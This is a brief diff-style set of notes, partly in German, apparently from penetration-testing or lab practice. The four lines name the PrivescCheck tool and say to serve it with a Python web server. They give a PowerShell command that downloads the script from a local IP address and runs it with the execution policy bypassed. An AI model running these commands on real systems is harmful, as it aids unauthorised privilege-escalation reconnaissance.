@@ -1,0 +1,4 @@
+https://github.com/itm4n/PrivescCheck
+bei python server port 80
+In der cmd: powershell -c “iwr http://192.168.1.157:80/PrivescCheck.ps1 -OutFile check.ps1”
+Powershell -ep bypass -c “. .\check.ps1; Invoke-PrivescCheck”
